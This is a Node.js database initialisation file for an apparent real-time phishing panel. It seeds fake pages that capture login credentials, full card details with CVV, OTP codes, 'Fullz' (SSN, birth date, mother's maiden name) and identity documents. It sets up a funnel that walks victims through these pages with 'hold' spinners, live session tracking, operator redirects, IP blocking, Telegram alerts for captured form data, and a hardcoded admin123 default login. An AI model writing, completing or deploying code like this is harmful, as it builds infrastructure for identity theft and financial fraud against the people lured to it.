const Database = require('better-sqlite3');
const path = require('path');
const config = require('../config/default');
const bcrypt = require('bcryptjs');
const { v4: uuidv4 } = require('uuid');

let db;

function getDb() {
  if (!db) {
    const dbPath = config.db.path;
    const dir = path.dirname(dbPath);
    const fs = require('fs');
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    db = new Database(dbPath);
    db.pragma('journal_mode = WAL');
    db.pragma('foreign_keys = ON');
    // Keep WAL small: checkpoint after every 100 pages (~400 KB) instead of
    // the SQLite default of 1000 pages (4 MB). A large un-checkpointed WAL
    // makes reads appear stale or wiped because readers scan both the main DB
    // file AND the WAL — if the WAL grows huge, reads become slow and
    // inconsistent until it is eventually merged.
    db.pragma('wal_autocheckpoint = 100');
    // Optimise for speed (safe on a single-process server)
    db.pragma('synchronous = NORMAL');
    db.pragma('cache_size = -8000');  // 8 MB page cache
  }
  return db;
}

function initialize() {
  const db = getDb();

  // Create tables
  db.exec(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE NOT NULL,
      email TEXT UNIQUE NOT NULL,
      password_hash TEXT NOT NULL,
      role TEXT DEFAULT 'viewer',
      avatar_color TEXT DEFAULT '#6366f1',
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      last_login DATETIME,
      session_token TEXT DEFAULT NULL
    );

    CREATE TABLE IF NOT EXISTS websites (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      name TEXT NOT NULL,
      domain TEXT NOT NULL,
      api_key TEXT UNIQUE NOT NULL,
      demo_slug TEXT,
      logo_url TEXT DEFAULT NULL,
      color TEXT DEFAULT '#6366f1',
      is_active INTEGER DEFAULT 1,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS sessions (
      id TEXT PRIMARY KEY,
      website_id INTEGER REFERENCES websites(id),
      visitor_id TEXT,
      ip_address TEXT,
      user_agent TEXT,
      browser TEXT,
      os TEXT,
      device TEXT,
      country TEXT,
      city TEXT,
      current_page TEXT,
      referrer TEXT,
      pages_viewed INTEGER DEFAULT 1,
      started_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      last_activity DATETIME DEFAULT CURRENT_TIMESTAMP,
      is_active INTEGER DEFAULT 1,
      metadata TEXT DEFAULT '{}'
    );

    CREATE TABLE IF NOT EXISTS page_views (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      session_id TEXT REFERENCES sessions(id),
      website_id INTEGER REFERENCES websites(id),
      page_url TEXT,
      page_title TEXT,
      duration_ms INTEGER DEFAULT 0,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS redirect_rules (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      website_id INTEGER REFERENCES websites(id),
      name TEXT,
      source_pattern TEXT DEFAULT '*',
      target_url TEXT NOT NULL,
      is_active INTEGER DEFAULT 1,
      apply_when_offline INTEGER DEFAULT 0,
      priority INTEGER DEFAULT 0,
      conditions TEXT DEFAULT '{}',
      redirect_count INTEGER DEFAULT 0,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS redirect_commands (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      session_id TEXT,
      website_id INTEGER,
      target_url TEXT,
      executed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      executed_by INTEGER REFERENCES users(id)
    );

    CREATE TABLE IF NOT EXISTS notifications (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      type TEXT DEFAULT 'info',
      title TEXT,
      message TEXT,
      link TEXT,
      is_read INTEGER DEFAULT 0,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS audit_logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER REFERENCES users(id),
      username TEXT,
      action TEXT,
      category TEXT DEFAULT 'general',
      details TEXT DEFAULT '{}',
      ip_address TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS settings (
      key TEXT PRIMARY KEY,
      value TEXT,
      updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS telegram_config (
      id INTEGER PRIMARY KEY DEFAULT 1,
      bot_token TEXT DEFAULT '',
      chat_id TEXT DEFAULT '',
      is_active INTEGER DEFAULT 0,
      notify_new_session INTEGER DEFAULT 1,
      notify_form_data INTEGER DEFAULT 1,
      notify_errors INTEGER DEFAULT 1,
      notify_page_views INTEGER DEFAULT 0
    );

    CREATE TABLE IF NOT EXISTS blocked_ips (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      ip_address TEXT UNIQUE NOT NULL,
      type TEXT DEFAULT 'manual',
      reason TEXT DEFAULT '',
      expires_at DATETIME DEFAULT NULL,
      blocked_requests INTEGER DEFAULT 0,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS activity_feed (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      type TEXT,
      icon TEXT,
      message TEXT,
      details TEXT DEFAULT '{}',
      website_id INTEGER,
      session_id TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE INDEX IF NOT EXISTS idx_sessions_website ON sessions(website_id);
    CREATE INDEX IF NOT EXISTS idx_sessions_active ON sessions(is_active);
    CREATE INDEX IF NOT EXISTS idx_page_views_session ON page_views(session_id);
    CREATE INDEX IF NOT EXISTS idx_page_views_website ON page_views(website_id);
    CREATE INDEX IF NOT EXISTS idx_page_views_timestamp ON page_views(timestamp);
    CREATE INDEX IF NOT EXISTS idx_audit_logs_timestamp ON audit_logs(timestamp);
    CREATE INDEX IF NOT EXISTS idx_activity_feed_timestamp ON activity_feed(timestamp);
    CREATE INDEX IF NOT EXISTS idx_notifications_read ON notifications(is_read);
    CREATE UNIQUE INDEX IF NOT EXISTS idx_websites_demo_slug ON websites(demo_slug);

    CREATE TABLE IF NOT EXISTS demo_pages (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      website_id INTEGER REFERENCES websites(id) ON DELETE CASCADE,
      url TEXT UNIQUE NOT NULL,
      name TEXT NOT NULL,
      form_type TEXT DEFAULT 'general',
      fields_schema TEXT DEFAULT '[]',
      field_mappings TEXT DEFAULT '{}'
    );

    CREATE TABLE IF NOT EXISTS funnels (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      website_id INTEGER REFERENCES websites(id) ON DELETE CASCADE,
      name TEXT NOT NULL,
      steps TEXT NOT NULL,
      is_active INTEGER DEFAULT 1,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );
  `);

  // Migrations for existing databases

  // Single-session enforcement: token rotated on every login
  try {
    db.exec(`ALTER TABLE users ADD COLUMN session_token TEXT DEFAULT NULL;`);
  } catch (e) { /* Column might already exist */ }

  try {
    db.exec(`ALTER TABLE websites ADD COLUMN demo_slug TEXT;`);
  } catch (e) {
    // Column might already exist
  }
  try {
    db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS idx_websites_demo_slug ON websites(demo_slug);`);
  } catch (e) {
    // Index might already exist
  }
  try {
    db.exec(`ALTER TABLE demo_pages ADD COLUMN website_id INTEGER REFERENCES websites(id) ON DELETE CASCADE;`);
  } catch (e) {
    // Column might already exist
  }
  try {
    db.exec(`ALTER TABLE demo_pages ADD COLUMN field_mappings TEXT DEFAULT '{}';`);
  } catch (e) {
    // Column might already exist
  }
  try {
    db.exec(`ALTER TABLE websites ADD COLUMN logo_url TEXT DEFAULT NULL;`);
  } catch (e) {
    // Column might already exist
  }
  try {
    db.exec(`ALTER TABLE websites ADD COLUMN color TEXT DEFAULT '#6366f1';`);
  } catch (e) {
    // Column might already exist
  }

  // ─── Per-website Telegram bot columns (Phase 3) ──────────────────────────────
  try {
    db.exec(`ALTER TABLE websites ADD COLUMN tg_bot_token TEXT DEFAULT NULL;`);
  } catch (e) { /* Column exists */ }
  try {
    db.exec(`ALTER TABLE websites ADD COLUMN tg_chat_id TEXT DEFAULT NULL;`);
  } catch (e) { /* Column exists */ }
  try {
    db.exec(`ALTER TABLE websites ADD COLUMN tg_allowed_users TEXT DEFAULT '[]';`);
  } catch (e) { /* Column exists */ }
  try {
    db.exec(`ALTER TABLE websites ADD COLUMN tg_bot_active INTEGER DEFAULT 0;`);
  } catch (e) { /* Column exists */ }

  // Add analytics columns to demo_pages (Phase 2)
  try {
    db.exec(`ALTER TABLE demo_pages ADD COLUMN views_count INTEGER DEFAULT 0;`);
  } catch (e) { /* Column exists */ }
  
  try {
    db.exec(`ALTER TABLE demo_pages ADD COLUMN submissions_count INTEGER DEFAULT 0;`);
  } catch (e) { /* Column exists */ }
  
  try {
    db.exec(`ALTER TABLE demo_pages ADD COLUMN last_activity_at DATETIME;`);
  } catch (e) { /* Column exists */ }
  
  try {
    db.exec(`ALTER TABLE demo_pages ADD COLUMN created_at DATETIME DEFAULT CURRENT_TIMESTAMP;`);
  } catch (e) { /* Column exists */ }
  
  try {
    db.exec(`ALTER TABLE demo_pages ADD COLUMN updated_at DATETIME DEFAULT CURRENT_TIMESTAMP;`);
  } catch (e) { /* Column exists */ }

  // Update existing websites/demo pages with default values if necessary
  try {
    db.prepare("UPDATE websites SET demo_slug = 'demo' WHERE name = 'Demo Website' AND (demo_slug IS NULL OR demo_slug = '')").run();
  } catch (e) {}
  try {
    const demoSite = db.prepare("SELECT id FROM websites WHERE name = 'Demo Website' LIMIT 1").get();
    if (demoSite) {
      db.prepare("UPDATE demo_pages SET website_id = ? WHERE website_id IS NULL").run(demoSite.id);
    }
  } catch (e) {}

  // Seed default admin if no users exist
  const userCount = db.prepare('SELECT COUNT(*) as count FROM users').get();
  if (userCount.count === 0) {
    const hash = bcrypt.hashSync(config.defaultAdmin.password, 10);
    db.prepare(`
      INSERT INTO users (username, email, password_hash, role, avatar_color)
      VALUES (?, ?, ?, ?, ?)
    `).run(
      config.defaultAdmin.username,
      config.defaultAdmin.email,
      hash,
      config.defaultAdmin.role,
      '#6366f1'
    );
    console.log('✅ Default admin created: admin / admin123');
  }

  // Seed default settings
  const settingsCount = db.prepare('SELECT COUNT(*) as count FROM settings').get();
  if (settingsCount.count === 0) {
    const defaults = {
      'site_name': 'Admin Live Panel',
      'maintenance_mode': '0',
      'maintenance_message': 'We are currently performing scheduled maintenance. Please check back soon.',
      'session_timeout': '30',
      'max_sessions_display': '100',
      'enable_geo_tracking': '1',
      'enable_activity_feed': '1',
      'data_retention_days': '90',
      'admin_online': '1',
      'notify_new_session': '1',
      'notify_form_data': '1',
      'notify_sound': '1',
      'notify_duration': '8'
    };
    const insert = db.prepare('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)');
    for (const [key, value] of Object.entries(defaults)) {
      insert.run(key, value);
    }
  }

  // Seed telegram config
  const tgCount = db.prepare('SELECT COUNT(*) as count FROM telegram_config').get();
  if (tgCount.count === 0) {
    db.prepare('INSERT INTO telegram_config (id) VALUES (1)').run();
  }

  // Seed a demo website
  const webCount = db.prepare('SELECT COUNT(*) as count FROM websites').get();
  if (webCount.count === 0) {
    const apiKey = 'demo-' + uuidv4().slice(0, 8);
    db.prepare(`
      INSERT INTO websites (name, domain, api_key, demo_slug) VALUES (?, ?, ?, ?)
    `).run('Demo Website', 'localhost', apiKey, 'demo');
    console.log(`✅ Demo website created with API key: ${apiKey}`);
  }

  // Seed demo pages
  const pageCount = db.prepare('SELECT COUNT(*) as count FROM demo_pages').get();
  if (pageCount.count === 0) {
    const website = db.prepare('SELECT id FROM websites WHERE name = ? LIMIT 1').get('Demo Website');
    const websiteId = website ? website.id : null;
    const pages = [
      { url: '/demo', name: 'Landing Page', form_type: 'general', fields_schema: '[]' },
      { url: '/demo/login', name: 'Login Credentials', form_type: 'login', fields_schema: '["email","password"]' },
      { url: '/demo/cc', name: 'Payment Card Info', form_type: 'credit_card', fields_schema: '["card_number","card_holder","expiry","cvv","billing_name","billing_zip","billing_country","billing_address"]' },
      { url: '/demo/otp', name: 'SMS/OTP Verification', form_type: 'otp', fields_schema: '["otp_code","phone"]' },
      { url: '/demo/fullz', name: 'Profile Details (Fullz)', form_type: 'general', fields_schema: '["ssn","dob","mother_maiden"]' },
      { url: '/demo/kyc', name: 'Identity Document Check', form_type: 'kyc', fields_schema: '["document_front","document_back"]' },
      { url: '/demo/loading', name: 'Hold Spinner Screen', form_type: 'general', fields_schema: '[]' }
    ];
    const insertPage = db.prepare('INSERT INTO demo_pages (website_id, url, name, form_type, fields_schema) VALUES (?, ?, ?, ?, ?)');
    for (const p of pages) {
      insertPage.run(websiteId, p.url, p.name, p.form_type, p.fields_schema);
    }
    console.log('✅ Default demo pages seeded');
  }

  // Seed a default funnel for the website
  const funnelCount = db.prepare('SELECT COUNT(*) as count FROM funnels').get();
  if (funnelCount.count === 0) {
    const website = db.prepare('SELECT id FROM websites WHERE name = ? LIMIT 1').get('Demo Website');
    if (website) {
      const steps = [
        { url: '/demo/login', behavior: 'auto' },
        { url: '/demo/loading', behavior: 'hold' },
        { url: '/demo/cc', behavior: 'auto' },
        { url: '/demo/otp', behavior: 'hold' },
        { url: '/demo/loading', behavior: 'hold' }
      ];
      db.prepare('INSERT INTO funnels (website_id, name, steps, is_active) VALUES (?, ?, ?, 1)')
        .run(website.id, 'Default Demo Funnel', JSON.stringify(steps));
      console.log('✅ Default demo funnel seeded');
    }
  }

  console.log('✅ Database initialized successfully');
  return db;
}

function getAdapter() {
  const { getAdapter: fetchAdapter } = require('./adapter');
  return fetchAdapter();
}

module.exports = { getDb, initialize, getAdapter };

